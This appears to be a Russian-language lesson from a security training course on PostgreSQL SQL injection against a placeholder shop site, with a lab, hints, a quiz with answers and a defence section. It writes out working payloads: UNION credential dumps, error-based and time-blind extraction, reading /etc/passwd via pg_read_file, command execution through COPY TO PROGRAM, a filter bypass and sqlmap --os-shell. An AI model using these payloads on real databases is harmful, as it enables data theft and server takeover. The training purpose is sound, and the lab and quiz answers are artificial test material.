---
id: db-postgresql
title: "PostgreSQL: инъекции на практике — COPY, файлы и RCE"
category: web
parent: web-sqli-dbms-open
difficulty: hard
order: 3
tags: [sqli, postgresql, postgres, union, copy, rce, pg_read_file, sqlmap]
prerequisites: [web-sqli, web-sqli-dbms]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 45
summary: "PostgreSQL от фингерпринта до RCE: pg_catalog, string_agg, pg_read_file, COPY TO/FROM PROGRAM, large objects и sqlmap."
lab:
  kind: shell
  title: 'Практика: PostgreSQL — pg_catalog и дамп'
  toolset: [core, curl]
  workdir: /home/student/task
  files: [task.md]
  check: 'grep -q ''nto{'' found.txt'
  hints:
    - 'Диалект: `curl -s "http://shop.example/item?id=1''"` — `unterminated quoted string`.'
    - 'В PostgreSQL агрегация строк — `string_agg`, конкатенация — `||`.'
    - 'Таблицы: `FROM pg_tables WHERE schemaname=''public''`.'
    - 'Флаг — в таблице `secrets`: `... string_agg(password,'','') ... FROM secrets`.'
---

## Задача

**PostgreSQL** — «серьёзная» база: на ней работают Django, Rails, множество SaaS и внутренних сервисов. Для атакующего она интересна тем, что даёт очень мощные примитивы: чтение файлов (`pg_read_file`), выполнение команд (`COPY ... FROM PROGRAM`) и большие объекты (`lo_import`/`lo_export`). Но всё это — под привилегиями. Разберём путь от кавычки до RCE на одном примере.

## Данные, с которыми работаем

Цель — `https://shop.example/item?id=1` (Django + PostgreSQL). Признаки PostgreSQL в ошибках: `ERROR: syntax error at or near`, `unterminated quoted string`, `column "..." does not exist`. Комментарий строки — `--` (пробел не обязателен) и `/* */`; символ `#` тут **не работает** (это отличие от MySQL).

```bash
$ curl -s "https://shop.example/item?id=1%27" | grep -o 'ERROR:[^<]*'
ERROR: unterminated quoted string at or near "'"
```

Диалект подтверждён. Читаем версию и текущую базу:

```bash
$ curl -s "https://shop.example/item?id=-1 UNION SELECT 1,version(),3-- -"
[[1,"PostgreSQL 16.2 on x86_64-pc-linux-gnu",3]]
```

## Шаг 1: схема через pg_catalog

PostgreSQL поддерживает и стандартный `information_schema`, и родной `pg_catalog` (он полнее). Таблицы текущей схемы лежат в `pg_tables`, базы — в `pg_database`, пользователи СУБД — в `pg_user`.

```bash
$ curl -s "https://shop.example/item?id=-1 UNION SELECT 1,string_agg(tablename,','),3 FROM pg_tables WHERE schemaname='public'-- -"
[[1,"users,products,orders",3]]
```

Агрегация строк делается функцией `string_agg` (аналог MySQL-`GROUP_CONCAT`). Конкатенация — через `||`:

```bash
$ curl -s "https://shop.example/item?id=-1 UNION SELECT 1,string_agg(column_name,','),3 FROM information_schema.columns WHERE table_name='users'-- -"
[[1,"id,username,password,email",3]]
```

## Шаг 2: дамп данных

Собираем пары `логин:пароль`. `E'\n'` — escape-строка с переводом строки; тип можно приводить через `CAST(x AS text)` или `x::text`.

```bash
$ curl -s "https://shop.example/item?id=-1 UNION SELECT 1,string_agg(username||':'||password,E'\n'),3 FROM users-- -"
>admin:$2b$12$...bcrypt
bob:trustno1<
```

Учётки получены. Это уже доказательство инъекции, но PostgreSQL позволяет пойти дальше.

## Шаг 3: error-based через CAST

Если вывод не отражается, но видно текст ошибки, данные можно вытащить приведением к числу. PostgreSQL честно скажет, что именно не смог преобразовать:

```bash
$ curl -s "https://shop.example/item?id=1 AND 1=CAST(version() AS int)-- -" | grep -o 'ERROR:[^<]*'
ERROR: invalid input syntax for type integer: "PostgreSQL 16.2 ..."
```

Тот же трюк с данными: `CAST((SELECT password FROM users LIMIT 1) AS int)` вернёт хэш в тексте ошибки. Ещё один error-канал — деление на ноль: `1/(CASE WHEN <условие> THEN 1 ELSE 0 END)`.

## Шаг 4: time-blind через pg_sleep

Когда не видно ни данных, ни ошибок, остаётся время. Функция задержки в PostgreSQL — `pg_sleep`:

```bash
$ time curl -s -o /dev/null "https://shop.example/item?id=1 AND (SELECT 1 FROM pg_sleep(5))-- -"
real    0m5.04s
```

Условие `CASE WHEN <вопрос> THEN pg_sleep(5) ELSE pg_sleep(0) END` даёт булев оракул: 5 секунд = «да». Если `pg_sleep` недоступен, используют тяжёлый запрос `generate_series(1,100000000)`.

## Шаг 5: чтение файлов через pg_read_file

Теперь самое интересное. Если у роли есть право суперпользователя (или `pg_read_server_files`), PostgreSQL читает любые файлы на сервере:

```bash
$ curl -s "https://shop.example/item?id=-1 UNION SELECT 1,pg_read_file('/etc/passwd'),3-- -"
[[1,"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:...",3]]
```

`pg_ls_dir('/')` покажет листинг каталога, а `pg_read_file('/var/www/html/config.php')` может вернуть конфиг с паролями к базе.

## Шаг 6: RCE через COPY ... FROM PROGRAM

Венец цепочки — выполнение команд. PostgreSQL умеет запускать программу и забирать её вывод в таблицу:

```sql
COPY (SELECT '') TO PROGRAM 'id > /tmp/out';
```

Вставленный в запрос:

```bash
$ curl -s "https://shop.example/item?id=1;COPY (SELECT '') TO PROGRAM 'id > /tmp/out'-- -"
$ curl -s "https://shop.example/item?id=-1 UNION SELECT 1,pg_read_file('/tmp/out'),3-- -"
[[1,"uid=999(postgres) gid=999(postgres) groups=999(postgres)",3]]
```

Команда `id` выполнена **на сервере**, и мы прочитали её вывод. Это RCE. Требуется право суперпользователя (или членство в `pg_execute_server_program`) — в старых версиях и на неаккуратных установках оно часто есть.

## Полный прогон от начала до конца

1. `id=1'` → `ERROR: unterminated quoted string` — PostgreSQL, инъекция есть.
2. `UNION SELECT version()` → `PostgreSQL 16.2`.
3. `pg_tables` → `users,products,orders`.
4. `string_agg(username||':'||password)` → реальные хэши.
5. `1=CAST(version() AS int)` → error-based канал.
6. `pg_sleep(5)` → time-blind канал.
7. `pg_read_file('/etc/passwd')` → файл прочитан.
8. `COPY ... TO PROGRAM 'id'` → `uid=999(postgres)` — RCE.

## Если не сработало

- **`#` не комментирует.** Это PostgreSQL: используй `--` или `/* */`.
- **`pg_sleep` нет / не суперпользователь.** Остаются boolean и error-based (`CAST`).
- **Файлы не читаются.** `pg_read_file` требует прав суперпользователя/`pg_read_server_files`.
- **`COPY ... PROGRAM` запрещён.** Нужны права; в новых версиях по умолчанию только суперпользователь.
- **Нужен сетевой канал.** Расширение `dblink` или `COPY ... FROM PROGRAM 'curl ...'` даёт OOB (внешние DNS/HTTP-запросы).
- **sqlmap.** `sqlmap -r request.txt -p id --batch --dbms=postgresql --dbs`, далее `--os-shell`.

## Шпаргалка PostgreSQL

| Задача | Payload |
|--------|---------|
| Версия / база / пользователь | `version()`, `current_database()`, `current_user` |
| Таблицы схемы | `SELECT tablename FROM pg_tables WHERE schemaname='public'` |
| Колонки | `information_schema.columns WHERE table_name='users'` |
| В одну строку | `string_agg(col, ',')`, конкатенация `\|\|` |
| Error-based | `CAST((SELECT ...) AS int)`, деление `1/(CASE WHEN ... )` |
| Time-blind | `pg_sleep(5)` в `CASE WHEN` |
| Чтение файла | `pg_read_file('/etc/passwd')`, `pg_ls_dir('/')` |
| RCE | `COPY (SELECT '') TO PROGRAM 'id'` |
| Проверка прав | `SELECT usesuper FROM pg_user WHERE usename=current_user` |

## На что смотреть дальше

- **`#` — только MySQL.** В PostgreSQL комментарий — `--` без обязательного пробела.
- **`string_agg`, не `GROUP_CONCAT`.** И конкатенация — `||`, а не `CONCAT` через запятую.
- **Error-based через `CAST(... AS int)`** — быстрый канал, когда видно ошибку.
- **RCE требует привилегий.** Проверяй `SELECT usesuper FROM pg_user WHERE usename=current_user`.
- **`pg_read_file` читает вне web-корня** — это часто даёт конфиги с паролями.
- **Large objects** (`lo_import`/`lo_export`) — ещё один путь к файлам, если обычные функции закрыты.

## Разбор: почему COPY ... FROM PROGRAM опаснее чтения файлов

Чтение файла через `pg_read_file` даёт утечку данных, но не выполнение кода. `COPY ... FROM PROGRAM` — другое дело: PostgreSQL сам запускает указанную команду через shell от имени сервисного пользователя `postgres`. Это прямая дорога к RCE, и она работает, если у роли есть право `pg_execute_server_program` (в старых версиях — просто суперпользователь).

Разница принципиальна для оценки риска. Утечка `/etc/passwd` — это раскрытие, но не компрометация хоста. Выполнение команды через `PROGRAM` — это уже код на сервере. Поэтому при разведке сначала проверяй права:

```sql
SELECT current_user, rolsuper FROM pg_roles WHERE rolname = current_user;
```

Суперпользователь открывает и файлы, и программу, и большие объекты.

Отдельный слой — расширения. `CREATE EXTENSION` от суперпользователя позволяет ставить расширения с C-кодом, а функции `lo_import`/`lo_export` дают читать и писать файлы в обход `pg_read_file`. Если `COPY TO PROGRAM` запрещён, но есть суперпользователь, попробуй записать разделяемую библиотеку в `$libdir` и подключить её через `LOAD`. Это классическая эскалация PostgreSQL, которую часто забывают проверить.

## Частые вопросы

**«Как понять, что бэкенд — PostgreSQL, а не MySQL?»** Диалектные функции: `version()` вернёт строку с «PostgreSQL», `current_database()`, приведение `::text`. В PostgreSQL конкатенация — `||`, комментарий — `--` или `/* */`. При слепом канале `pg_sleep(5)` даёт характерную задержку.

**«pg_sleep не срабатывает — что это значит?»** Либо параметр не инъецируем в контекст, где функция исполняется, либо фильтр вырезает вызов. Попробуй другой контекст (например, в `ORDER BY` или в подзапросе), а если фильтр — обходи через регистр или комментарии: `pg_sl/**/eep(5)`.

**«Файлы читаются, а программа нет — почему?»** Скорее всего роль не суперпользователь либо нет `pg_execute_server_program`. Проверь `has_function_privilege` и текущие права. Иногда помогает запись через `lo_export` в каталог, откуда файл подхватит другой механизм.

## Защита

Приложение должно ходить в БД под ролью без `SUPERUSER` и без прав на `COPY ... PROGRAM`, `pg_read_file`, `lo_import`. Ограничь `CREATE EXTENSION` только администратором, а `shared_preload_libraries` держи под контролем. Файловая система сервера БД должна быть доступна процессу `postgres` минимально, а исходящий трафик — ограничен. Параметризация запросов в приложении закрывает причину.

## Квиз

Проверь себя.

```quiz
- question: 'Ошибка `ERROR: syntax error at or near` указывает на какую СУБД?'
  options:
    - "MySQL"
    - "PostgreSQL"
    - "MSSQL"
    - "SQLite"
  answer: 1
  explanation: "«syntax error at or near» — характерная формулировка PostgreSQL."
- question: "Какая функция агрегирует строки в PostgreSQL?"
  options:
    - "GROUP_CONCAT"
    - "string_agg"
    - "LISTAGG"
    - "STRING_JOIN"
  answer: 1
  explanation: "string_agg(x, ',') — аналог GROUP_CONCAT из MySQL."
- question: "Как организовать time-blind в PostgreSQL?"
  options:
    - "SLEEP(5)"
    - "pg_sleep(5)"
    - "WAITFOR DELAY"
    - "dbms_pipe"
  answer: 1
  explanation: "Задержка делается функцией pg_sleep."
- question: "Что выполняет команду на сервере PostgreSQL?"
  options:
    - "pg_read_file"
    - "COPY ... TO PROGRAM"
    - "string_agg"
    - "CAST AS int"
  answer: 1
  explanation: "COPY TO/FROM PROGRAM запускает программу и забирает её вывод — это RCE."
- question: "Почему символ # не закомментирует запрос в PostgreSQL?"
  options:
    - "Он экранируется"
    - "# — комментарий MySQL, а в PostgreSQL комментарий это --"
    - "Он работает только в Oracle"
    - "Он удаляет базу"
  answer: 1
  explanation: "В PostgreSQL строковый комментарий — --; # там не комментарий."
```

## Куда дальше

Следующий урок (`db-mssql`) разберёт Microsoft SQL Server — корпоративную базу, где главный инструмент RCE называется `xp_cmdshell`. А пока главное запомни: PostgreSQL — это `string_agg`, error-based через `CAST`, чтение файлов и RCE через `COPY ... FROM PROGRAM`; всё решают привилегии.

## Где пригодится

- **CTF (Web):** PostgreSQL-задачи на UNION, error-based и `COPY ... PROGRAM`.
- **Bug bounty:** дамп учёток и чтение файлов превращают SQLi в critical.
- **Пентест:** отчёт с точным диалектом и PoC RCE ценится выше скана.
- **Работа (AppSec):** минимум прав у DB-роли, запрет `COPY ... PROGRAM` и `pg_read_server_files` для приложения.
